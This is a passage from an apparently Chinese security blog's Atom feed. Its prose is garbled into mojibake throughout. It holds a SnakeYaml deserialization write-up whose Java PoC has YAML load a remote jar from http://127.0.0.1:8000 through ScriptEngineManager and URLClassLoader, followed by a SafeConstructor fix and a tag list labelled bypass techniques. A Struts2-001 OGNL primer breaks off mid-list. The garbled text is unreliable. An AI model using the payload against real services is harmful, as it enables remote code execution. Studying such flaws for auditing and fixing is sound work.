    <link href="https://ki10moc.github.io/2023/01/30/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://ki10moc.github.io/2023/01/30/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-01-30T03:35:36.000Z</published>
    <updated>2023-06-05T03:56:03.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="demoåˆ©ç”¨"><a class="markdownIt-Anchor" href="#demoåˆ©ç”¨">#</a> Demo åˆ©ç”¨</h3><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>å°†æºç ç®€å•ä¿®æ”¹ä¸‹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151636.png" alt="image-20230605115147426"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151170.png" alt="image-20230605115156615"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8000/yaml-payload.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(ä½¿ç”¨å›¾ç‰‡ä¸­è‡ªå·± cv çš„ä»£ç æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œå¡äº†åŠå¤©ï¼Œå¹²è„†ç›´æ¥ down äº† github çš„ poc æ‰æ‰§è¡ŒæˆåŠŸçš„</p><p>åŸæ¥è¿˜æœ‰ä¸ª SPI æœºåˆ¶</p><h3 id="spiæœºåˆ¶"><a class="markdownIt-Anchor" href="#spiæœºåˆ¶">#</a> SPI æœºåˆ¶</h3><p>SPI ï¼Œå…¨ç§°ä¸º Service Provider Interfaceï¼Œæ˜¯ä¸€ç§æœåŠ¡å‘ç°æœºåˆ¶ã€‚å®ƒé€šè¿‡åœ¨ ClassPath è·¯å¾„ä¸‹çš„ META-INF/services æ–‡ä»¶å¤¹æŸ¥æ‰¾æ–‡ä»¶ï¼Œè‡ªåŠ¨åŠ è½½æ–‡ä»¶é‡Œæ‰€å®šä¹‰çš„ç±»ã€‚ä¹Ÿå°±æ˜¯åŠ¨æ€ä¸ºæŸä¸ªæ¥å£å¯»æ‰¾æœåŠ¡å®ç°</p><p>å¦‚æœéœ€è¦ä½¿ç”¨ SPI æœºåˆ¶éœ€è¦åœ¨ Java classpath ä¸‹çš„  <code>META-INF/services/</code>  ç›®å½•é‡Œåˆ›å»ºä¸€ä¸ªä»¥æœåŠ¡æ¥å£å‘½åçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œçš„å†…å®¹å°±æ˜¯è¿™ä¸ªæ¥å£çš„å…·ä½“çš„<strong>å®ç°ç±»</strong></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152172.png" alt="image-20230605115213134"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨ META-INF/services ä¸‹åˆ›å»ºä¸€ä¸ªä»¥æœåŠ¡æ¥å£å‘½åçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œçš„å†…å®¹å°±æ˜¯è¿™ä¸ªæ¥å£çš„å…·ä½“çš„å®ç°ç±»çš„å…¨ç±»åï¼Œåœ¨åŠ è½½è¿™ä¸ªæ¥å£çš„æ—¶å€™å°±ä¼šå®ä¾‹åŒ–é‡Œé¢å†™ä¸Šçš„ç±»</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152405.png" alt="image-20230605115222968"></p><p>SPI ä¼šé€šè¿‡ <code>java.util.ServiceLoder</code>  è¿›è¡ŒåŠ¨æ€åŠ è½½å®ç°ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™ï¼ŒSPI æœºåˆ¶é€šè¿‡ <code>Class.forNam</code>  åå°„åŠ è½½å¹¶ä¸” <code>newInstance()</code>  åå°„åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œé™æ€ä»£ç å—è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚</p><p>è¿™é‡Œå…ˆæ’ä¸€å¥è¯´ä¸‹ï¼ï¼æ˜¯ä»€ä¹ˆ</p><p>!! å°±ç›¸å½“äº fastjson é‡Œçš„ @typeï¼Œç”¨äºæŒ‡å®šè¦ååºåˆ—åŒ–çš„å…¨ç±»åã€‚</p><p>è·Ÿè¿›åˆ° loadFromReader ä¸‹ setComposerï¼ŒæŒ‡å®šååºåˆ—åŒ–å…¨ç±»å</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152765.png" alt="image-20230605115237095"></p><p>ä¸Šä¸€æ­¥ name å–åˆ° javax.script.ScriptEngineManagerï¼Œè¿™é‡Œåå°„åˆ›å»º javax.script.ScriptEngineManager å¯¹è±¡</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051152528.png" alt="image-20230605115250020"></p><p>è¿™é‡Œåˆ›å»ºæ•°ç»„åˆ—è¡¨ï¼Œè°ƒç”¨ node.getType ().getDeclaredConstructors ()  éå†å®Œçš„ç»“æœé€šè¿‡ possibleConstructors.add å†æ·»åŠ åˆ°<br> Class.forName è¿›è¡Œåˆ›å»ºåå°„å¯¹è±¡å¹¶ä¸”èµ‹å€¼ç»™ note çš„ type é‡Œé¢ã€‚è€Œåè¿™é‡Œ getDeclaredConstructors () è·å–å®ƒçš„æ— å‚æ„é€ æ–¹æ³•ã€‚</p><p><img src="https://img-blog.csdnimg.cn/7b9527e27db64ac9b7cc5c779d9da017.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†åˆ°è¿™é‡Œè¿”å›å®ä¾‹å¯¹è±¡</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153467.png" alt="image-20230605115300840"></p><p>construct æ„é€ å™¨åŠ è½½è¿›æ¥</p><p>value å°±æ˜¯æ¶æ„ç±»</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153960.png" alt="image-20230605115318765"><br> å†åŠ è½½ä¸€è½®</p><p>å°±æ‹¿åˆ°äº†<strong> javax.script.ScriptEngineManager å®ä¾‹åŒ–å¯¹è±¡</strong><br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153509.png" alt="image-20230605115339023"></p><p>åå°„è°ƒç”¨å°†æ•°ç»„å¯¹è±¡èµ‹å€¼ç»™ cï¼Œæœ€åå†å®ä¾‹åŒ–</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051153544.png" alt="image-20230605115354110"></p><p>è¿™é‡Œå†è¿”å›è¦åŠ è½½åœ°å€<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154812.png" alt="image-20230605115407350"><br> æœ€å</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154770.png" alt="image-20230605115421143"></p><p>ä¸‹é¢å†æ¥çœ‹ä¸‹ SPI æœºåˆ¶çš„å®ç°</p><p>æ–­ç‚¹ä¸‹åœ¨ <code>ScriptEngineManager</code>  #75</p><p>ServiceLoader åŠ¨æ€åŠ è½½ç±»<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154277.png" alt="image-20230605115439050"></p><p>hasNexService æ–¹æ³•</p><p>åŠ è½½ <code>META-INF/services/javax.script.ScriptEngineFactory</code>  è·å–å®ç°ç±»</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154158.png" alt="image-20230605115448854"></p><p>å®ä¾‹åŒ–</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051154738.png" alt="image-20230605115458440"></p><p>èµ°åˆ°åé¢å°±æ‰§è¡ŒæˆåŠŸ</p><h3 id="æ¼æ´ä¿®å¤"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤">#</a> æ¼æ´ä¿®å¤</h3><p>æ¼æ´æ¶‰åŠåˆ°äº†å…¨ç‰ˆæœ¬ï¼Œåªè¦ååºåˆ—åŒ–å†…å®¹å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><p>ä¿®å¤æ–¹æ¡ˆï¼šåŠ å…¥ <code>new SafeConstructor()</code>  ç±»è¿›è¡Œè¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/yaml-payload-master.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051155702.png" alt="image-20230605115508920"></p><p>å†æ¬¡æ‰§è¡Œä¼šæŠ›å‡ºå¼‚å¸¸</p><p>ä¹Ÿå¯ä»¥æ‹’ç»ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ“ä½œï¼Œååºåˆ—åŒ–æ•°æ®ç»è¿‡æ ¡éªŒæˆ–è€…æ‹’ç»ååºåˆ—åŒ–æ•°æ®å¯æ§</p><p>åœ¨å®¡è®¡ä¸­å…¶å®å°±å¯ä»¥ç›´æ¥å®šä½ <code>yaml.load();</code> ï¼Œç„¶åè¿›è¡Œå›æº¯ï¼Œå¦‚è‹¥å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•ä¼ å…¥ payloadã€‚</p><p>ä¸€äº›ç»•è¿‡æ‰‹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;tag:yaml.org,2002:&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">YAML</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:yaml&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">MERGE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:merge&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">SET</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:set&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">PAIRS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:pairs&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">OMAP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:omap&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">BINARY</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:binary&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">INT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:int&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">FLOAT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:float&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">TIMESTAMP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:timestamp&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">BOOL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:bool&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">NULL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:null&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">STR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:str&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">SEQ</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:seq&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Tag</span> <span class="variable">MAP</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tag</span>(<span class="string">&quot;tag:yaml.org,2002:map&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;demoåˆ©ç”¨&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#demoåˆ©ç”¨&quot;&gt;#&lt;/a&gt; Demo åˆ©ç”¨&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https:</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-001</title>
    <link href="https://ki10moc.github.io/2023/01/28/Struts2-001/"/>
    <id>https://ki10moc.github.io/2023/01/28/Struts2-001/</id>
    <published>2023-01-28T12:22:36.000Z</published>
    <updated>2024-06-08T15:21:44.869Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ognlè¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#ognlè¡¨è¾¾å¼">#</a> OGNL è¡¨è¾¾å¼</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">OGNL æ˜¯ Object-Graph Navigation Language çš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼ˆExpression Languageï¼Œç®€ç§°ä¸º ELï¼‰ï¼Œé€šè¿‡å®ƒç®€å•ä¸€è‡´çš„è¡¨è¾¾å¼è¯­æ³•ï¼Œå¯ä»¥å­˜å–å¯¹è±¡çš„ä»»æ„å±æ€§ï¼Œè°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼Œéå†æ•´ä¸ªå¯¹è±¡çš„ç»“æ„å›¾ï¼Œå®ç°å­—æ®µç±»å‹è½¬åŒ–ç­‰åŠŸèƒ½ã€‚å®ƒä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼å»å­˜å–å¯¹è±¡çš„å±æ€§ã€‚ OGNL ä¸‰è¦ç´ ï¼š(ä»¥ä¸‹éƒ¨åˆ†æ‘˜æŠ„äº’è”ç½‘æŸå¤„, æˆ‘è§‰å¾—è¯´å¾—å¥½)</span><br><span class="line"></span><br><span class="line">1ã€è¡¨è¾¾å¼ï¼ˆExpressionï¼‰</span><br><span class="line"></span><br><span class="line">è¡¨è¾¾å¼æ˜¯æ•´ä¸ª OGNL çš„æ ¸å¿ƒï¼Œæ‰€æœ‰çš„ OGNL æ“ä½œéƒ½æ˜¯é’ˆå¯¹è¡¨è¾¾å¼çš„è§£æåè¿›è¡Œçš„ã€‚è¡¨è¾¾å¼ä¼šè§„å®šæ­¤æ¬¡ OGNL æ“ä½œåˆ°åº•è¦å¹²ä»€ä¹ˆã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¸Šé¢çš„æµ‹è¯•ä¸­ï¼Œnameã€department.name ç­‰éƒ½æ˜¯è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºå– name æˆ–è€… department ä¸­çš„ name çš„å€¼ã€‚OGNL æ”¯æŒå¾ˆå¤šç±»å‹çš„è¡¨è¾¾å¼ï¼Œä¹‹åæˆ‘ä»¬ä¼šçœ‹åˆ°æ›´å¤šã€‚</span><br><span class="line"></span><br><span class="line">2ã€æ ¹å¯¹è±¡ï¼ˆRoot Objectï¼‰</span><br><span class="line"></span><br><span class="line">æ ¹å¯¹è±¡å¯ä»¥ç†è§£ä¸º OGNL çš„æ“ä½œå¯¹è±¡ã€‚åœ¨è¡¨è¾¾å¼è§„å®šäº† â€œå¹²ä»€ä¹ˆâ€ ä»¥åï¼Œä½ è¿˜éœ€è¦æŒ‡å®šåˆ°åº•â€œå¯¹è°å¹²â€ã€‚åœ¨ä¸Šé¢çš„æµ‹è¯•ä»£ç ä¸­ï¼Œuser å°±æ˜¯æ ¹å¯¹è±¡ã€‚è¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ user è¿™ä¸ªå¯¹è±¡å»å– name è¿™ä¸ªå±æ€§çš„å€¼ï¼ˆå¯¹ user è¿™ä¸ªå¯¹è±¡å»è®¾ç½®å…¶ä¸­çš„ department ä¸­çš„ name å±æ€§å€¼ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">3ã€ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰</span><br><span class="line"></span><br><span class="line">æœ‰äº†è¡¨è¾¾å¼å’Œæ ¹å¯¹è±¡ï¼Œæˆ‘ä»¬å®é™…ä¸Šå·²ç»å¯ä»¥ä½¿ç”¨ OGNL çš„åŸºæœ¬åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œæ ¹æ®è¡¨è¾¾å¼å¯¹æ ¹å¯¹è±¡è¿›è¡Œå–å€¼æˆ–è€…è®¾å€¼å·¥ä½œã€‚ä¸è¿‡å®é™…ä¸Šï¼Œåœ¨ OGNL çš„å†…éƒ¨ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿™ä¸ªç¯å¢ƒå°±æ˜¯ OGNL çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ã€‚è¯´å¾—å†æ˜ç™½ä¸€äº›ï¼Œå°±æ˜¯è¿™ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆContextï¼‰ï¼Œå°†è§„å®š OGNL çš„æ“ä½œ â€œåœ¨å“ªé‡Œå¹²â€ã€‚</span><br><span class="line">OGN L çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ä¸€ä¸ª Map ç»“æ„ï¼Œç§°ä¹‹ä¸º OgnlContextã€‚ä¸Šé¢æˆ‘ä»¬æåˆ°çš„æ ¹å¯¹è±¡ï¼ˆRoot</span><br><span class="line">Objectï¼‰ï¼Œäº‹å®ä¸Šä¹Ÿä¼šè¢«åŠ å…¥åˆ°ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å»ï¼Œå¹¶ä¸”è¿™å°†ä½œä¸ºä¸€ä¸ªç‰¹æ®Šçš„å˜é‡è¿›è¡Œå¤„ç†ï¼Œå…·ä½“å°±è¡¨ç°ä¸ºé’ˆå¯¹æ ¹å¯¹è±¡ï¼ˆRoot</span><br><span class="line">Objectï¼‰çš„å­˜å–æ“ä½œçš„è¡¨è¾¾å¼æ˜¯ä¸éœ€è¦å¢åŠ  #ç¬¦å·è¿›è¡ŒåŒºåˆ†çš„ã€‚</span><br></pre></td></tr></table></figure><p>å¯¹è¡¨è¾¾å¼çš„ç®€å•ä½¿ç”¨è¯´æ˜</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. åŸºæœ¬å¯¹è±¡æ ‘çš„è®¿é—®</span><br><span class="line">å¯¹è±¡æ ‘çš„è®¿é—®å°±æ˜¯é€šè¿‡ä½¿ç”¨ç‚¹å·å°†å¯¹è±¡çš„å¼•ç”¨ä¸²è”èµ·æ¥è¿›è¡Œã€‚</span><br><span class="line">ä¾‹å¦‚ï¼šxxxxï¼Œxxxx.xxxxï¼Œxxxx. xxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">2. å¯¹å®¹å™¨å˜é‡çš„è®¿é—®</span><br><span class="line">å¯¹å®¹å™¨å˜é‡çš„è®¿é—®ï¼Œé€šè¿‡#ç¬¦å·åŠ ä¸Šè¡¨è¾¾å¼è¿›è¡Œã€‚</span><br><span class="line">ä¾‹å¦‚ï¼š#xxxxï¼Œ#xxxx. xxxxï¼Œ#xxxx.xxxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">3. ä½¿ç”¨æ“ä½œç¬¦å·</span><br><span class="line">OGNLè¡¨è¾¾å¼ä¸­èƒ½ä½¿ç”¨çš„æ“ä½œç¬¦åŸºæœ¬è·ŸJavaé‡Œçš„æ“ä½œç¬¦ä¸€æ ·ï¼Œé™¤äº†èƒ½ä½¿ç”¨ +, -, *, /, ++, --, ==, !=, = ç­‰æ“ä½œç¬¦ä¹‹å¤–ï¼Œè¿˜èƒ½ä½¿ç”¨ mod, in, not inç­‰ã€‚</span><br><span class="line"></span><br><span class="line">4. å®¹å™¨ã€æ•°ç»„ã€å¯¹è±¡</span><br><span class="line">OGNLæ”¯æŒå¯¹æ•°ç»„å’ŒArrayListç­‰å®¹å™¨çš„é¡ºåºè®¿é—®ï¼šä¾‹å¦‚ï¼šgroup.users[0]</span><br><span class="line">åŒæ—¶ï¼ŒOGNLæ”¯æŒå¯¹Mapçš„æŒ‰é”®å€¼æŸ¥æ‰¾ï¼š</span><br><span class="line">ä¾‹å¦‚ï¼š#session[&#x27;mySessionPropKey&#x27;]</span><br><span class="line">ä¸ä»…å¦‚æ­¤ï¼ŒOGNLè¿˜æ”¯æŒå®¹å™¨çš„æ„é€ çš„è¡¨è¾¾å¼ï¼š</span><br><span class="line">ä¾‹å¦‚ï¼š&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;æ„é€ ä¸€ä¸ªListï¼Œ#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;æ„é€ ä¸€ä¸ªMap</span><br><span class="line">ä½ ä¹Ÿå¯ä»¥é€šè¿‡ä»»æ„ç±»å¯¹è±¡çš„æ„é€ å‡½æ•°è¿›è¡Œå¯¹è±¡æ–°å»º</span><br><span class="line">ä¾‹å¦‚ï¼šnew Java.net.URL(&quot;xxxxxx/&quot;)</span><br><span class="line"></span><br><span class="line">5. å¯¹é™æ€æ–¹æ³•æˆ–å˜é‡çš„è®¿é—®</span><br><span class="line">è¦å¼•ç”¨ç±»çš„é™æ€æ–¹æ³•å’Œå­—æ®µï¼Œä»–ä»¬çš„è¡¨è¾¾æ–¹å¼æ˜¯ä¸€æ ·çš„@class@memberæˆ–è€…@class@method(args)ï¼š</span><br><span class="line"></span><br><span class="line">6. æ–¹æ³•è°ƒç”¨</span><br><span class="line">ç›´æ¥é€šè¿‡ç±»ä¼¼Javaçš„æ–¹æ³•è°ƒç”¨æ–¹å¼è¿›è¡Œï¼Œä½ ç”šè‡³å¯ä»¥ä¼ é€’å‚æ•°ï¼š</span><br><span class="line">ä¾‹å¦‚ï¼šuser.getName()ï¼Œgroup.users.size()ï¼Œgroup.containsUser(#requestUser)</span><br><span class="line"></span><br><span class="line">7. æŠ•å½±å’Œé€‰æ‹©</span><br><span class="line">OGNLæ”¯æŒç±»ä¼¼æ•°æ®åº“ä¸­çš„æŠ•å½±ï¼ˆprojectionï¼‰ å’Œé€‰æ‹©ï¼ˆselectionï¼‰ã€‚</span><br><span class="line">æŠ•å½±å°±æ˜¯é€‰å‡ºé›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„ç›¸åŒå±æ€§ç»„æˆæ–°çš„é›†åˆï¼Œç±»ä¼¼äºå…³ç³»æ•°æ®åº“çš„å­—æ®µæ“ä½œã€‚æŠ•å½±æ“ä½œè¯­æ³•ä¸º collection.&#123;XXX&#125;ï¼Œå…¶ä¸­XXX æ˜¯è¿™ä¸ªé›†åˆä¸­æ¯ä¸ªå…ƒç´ çš„å…¬å…±å±æ€§ã€‚</span><br><span class="line">ä¾‹å¦‚ï¼šgroup.userList.&#123;username&#125;å°†è·å¾—æŸä¸ªgroupä¸­çš„æ‰€æœ‰userçš„nameçš„åˆ—è¡¨ã€‚</span><br><span 